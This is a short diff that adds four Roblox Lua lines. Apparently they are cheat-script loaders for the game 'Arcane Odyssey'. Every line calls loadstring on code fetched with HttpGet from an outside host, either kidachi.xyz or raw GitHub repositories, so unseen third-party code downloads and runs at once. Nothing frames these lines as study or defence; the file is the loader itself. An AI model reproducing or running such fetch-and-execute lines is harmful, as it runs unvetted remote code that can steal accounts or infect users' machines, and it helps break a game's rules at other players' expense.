@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://kidachi.xyz/Odyssey", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/unknxwnlocal/localshitscripts/main/shitterarcane"))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/itsyouranya/free/main/arcaneodyssey.lua"),true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xtrey10x/xtrey10x-hub/main/Arcane%20Odyssey%20Script"))();
